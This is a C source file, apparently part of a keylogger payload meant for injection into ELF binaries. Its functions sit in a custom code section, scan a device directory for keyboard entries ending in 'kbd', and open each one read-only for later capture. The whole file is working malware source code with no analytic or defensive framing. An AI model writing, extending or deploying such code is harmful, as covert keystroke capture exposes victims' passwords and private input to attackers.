
#include "setup.h"
#include "payload.h"

__attribute__((section(ELF_CODE))) static int is_keyboard(const struct dirent *file)
{
    size_t len = strlen(file->d_name);

    return len > 3
        && file->d_name[len - 3] == 'k'
        && file->d_name[len - 2] == 'b'
        && file->d_name[len - 1] == 'd';
}

__attribute__((section(ELF_CODE))) int *find_keyboards(void)
{
    struct dirent **char_devices = NULL;
    register int possible_paths = scandir(DIR_PATH, &char_devices,
                &is_keyboard, &alphasort);
    int *result = NULL;
    char *rpath = NULL;

    __log("Seeking keyboards");
    if (possible_paths == -1 || chdir(DIR_PATH) < 0)
        return NULL;

    rpath = malloc(sizeof(char) * BUFFER_SIZE);
    result = malloc(sizeof(int) * (possible_paths + 1));
    if (!rpath || !result)
        return NULL;

    result[possible_paths] = -1;
    for (int ctr = -1; ++ctr < possible_paths;) {
        __log("Found keyboard");
        rpath = realpath(char_devices[ctr]->d_name, rpath);
        result[ctr] = open(rpath, O_RDONLY);
    }

    for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);

    return result;
}

